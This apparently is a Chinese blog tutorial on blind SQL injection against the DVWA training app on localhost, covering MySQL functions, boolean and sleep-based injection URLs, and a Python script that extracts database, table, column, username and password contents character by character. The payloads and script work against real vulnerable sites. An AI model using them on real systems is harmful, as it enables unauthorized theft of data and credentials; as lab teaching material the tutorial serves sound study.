---
title: mysql盲注
comments: false
date: 2016-05-27 13:21:58
categories: 安全
tags: [Web安全,SQL注入,Python]
---
dvwa-mysql盲注
<!--more-->
## 一、盲注SQL基础
### 函数
mysql中有几个函数可以用来进行盲注。包括  sleep(),ascii(),substring(),length()，if()等。其中：   
sleep(): 指定秒数来运行语句  
ascii() 返回ASCII码  
substring() 截取字符串长度  
用法：`SubString(string, int, int)  `  
返回第一个参数中从第二个参数指定的位置开始、第三个参数指定的长度的子字符串   
length() 返回字符串长度  
if() IF(Condition,A,B) 意义：当Condition为TRUE时，返回A；当Condition为FALSE时，返回B  

例如：
在mysql中分别运行  
`select sleep(5);`
会出现5秒延迟。
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind_001.png)  
`select if(1,sleep(5),1)`
如果为真，就延时5秒，否则返回1  
查询当前数据库长度
`select length(database());`
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-002.png)  
截取当前数据库第一个字符
`select substring(database(),1,1);`
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-003.png)  
当前数据库第一个字符的ascii码
`select ascii(substring(database(),1,1));`
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-004.png)  
对dvwa进行盲注，由于盲注没有提示，只能根据页面返回错误与否进行判断。  
### 如何判断长度：
`select length(database())>1;`
返回1，代表正确
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-006.png)  
`select length(database())>2;`
同样正确，继续增加。  
查询`select length(database())>4;`
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-007.png)  
返回0，代表错误。即长度不大于4
再查询`select length(database())=4;`
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-008.png)  
返回1，代表正确，所以当前数据库长度为4
### 如何查询内容
`select ascii(substring(database(),1,1))>2`
返回正确，即当前数据库第一个字符的ascii大于2，在这里可以使用二分法，最终    
`select ascii(substring(database(),1,1))=100`,返回正确。即当前数据库第一个字符ascii为100，也就是d  
以此类推，`select ascii(substring(database(),2,1))=118`可以得到所以数据库所以内容。  
### dvwa中sql盲注语句:
首先判断长度。  
`http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and length(database())>1-- &Submit=Submit#`


返回
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-005.png)  
继续增大数字,最终得到
`http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and length(database())=4-- &Submit=Submit#`
返回正确，同上，查询内容
`http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and ascii(substring( database(),1,1))=100-- &Submit=Submit#`

得到第一个字符，以此类推，可以得到当前数据库名称。  


## 二、利用python脚本
前面手工的过程太过繁琐，可以利用python脚本来辅助。
这里写了个简单的python脚本。利用前面的dvwa模拟登录脚本免登录  
查询长度，使用循环判断
```
def get_len(input_str):
    for i in range(1, 20):
        payload = "' and length(%s)=%d-- " % (input_str, i)
        url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1%s&Submit=Submit#" % payload
        html = sql_get.get(url)
        if (html.text.find("User ID exists in the database") != -1):
            # print("长度=", i)
            return i
```
在这里input_str为查询的内容，如database(),user()等  


查询字符ascii，这里使用二分法进行查找  
```
def get_ascii(min_num, max_num, input_str, i, url):
    mid_num = int((min_num + max_num) / 2)
    payload = "' and ascii(substring(%s, %d, 1)) > %d-- " % (input_str, i, mid_num)
    url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1%s&Submit=Submit#" % payload
    # print(url)
    html = sql_get.get(url)
    if (max_num - min_num) == 1:
        if (html.text.find("User ID exists in the database") != -1):
            return max_num
        else:
            return min_num
    if (html.text.find("User ID exists in the database") != -1):

        min_num = mid_num
        return get_ascii(min_num, max_num, input_str, i, url)

    else:
        max_num = mid_num
        return get_ascii(min_num, max_num, input_str, i, url)

```
得到内容，这里调用get_ascii函数，根据长度循环
```
def get_cont(input_str, the_get_len):
    max_num = 127
    min_num = 33
    mid_num = 1
    ascii_cont = ""
    for i in range(1, the_get_len + 1):
        payload = "' and ascii(substring(%s, %d, 1)) > %d-- " % (input_str, i, mid_num)
        url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1%s&Submit=Submit#" % payload
        temp_ascii = get_ascii(min_num, max_num, input_str, i, url)
        temp_ascii = chr(temp_ascii)
        ascii_cont += temp_ascii

    return ascii_cont
```
主函数为
```
def main():
    input_str = input("输入：")
    the_get_len = get_len(input_str)
    print(input_str, '长度=', the_get_len)
    ascii_cont = get_cont(input_str, the_get_len)
    print("内容:", ascii_cont)
```
## 三、查询表的内容
如何查到表的内容，由于mysql是支持嵌套查询的，可以利用嵌套查询得到内容。这里可以参考普通注入的语句。  
在mysql中查询
`select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x64767761`
可以得到dvwa数据库的所有的表名。
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-009.png)  
`select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x64767761 limit 0,1;`可以得到dvwa数据库的第一行表名。  
所以在盲注中可以这样查询：
```
http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and ascii(substring((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=0x64767761 limit 0,1),1, 1))=103--
&Submit=Submit#
```
得到第一个字符，即g；
然后同上，可以依次得到表名。

得到表名后，查询字段名称。  
在mysql中查询
`select column_name from information_schema.columns where table_name=0x7573657273`
得到user表中所以字段名。
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-010.png)  
所以在盲注中可以这样查询：
```
http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and ascii(substring((select column_name from information_schema.columns where table_name=0x7573657273 limit 0,1),1, 1))>x--
&Submit=Submit#
```
依次类推，可以得到所有字段；
得到字段后，查询内容  
在mysql中查询
`select user from users`，得到user字段的内容  
`select password from users`，得到password字段的内容  
![](http://7xo8y2.com1.z0.glb.clouddn.com/image/sql-blind/sql_blind-011.png)
所以在盲注中可以这样查询：
```
http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and ascii(substring((select user from users limit 0,1),1, 1))>x--
&Submit=Submit#
```
```
http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and ascii(substring((select password from users limit 0,1),1, 1))>x--
&Submit=Submit#
```
依次得到user和password的内容。

除了这种方式外，也可以使用sleep函数。
例如，查询长度。
```
http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and if(length(database())=4,sleep(5),1)-- &Submit=Submit#
```
查询内容
```
http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1' and if(ascii(substring( database(),1,1))=100,sleep(5),1)-- &Submit=Submit#
```
同理，也可以查询其它的内容。

事实上，一般可以使用sqlmap进行盲注查询。
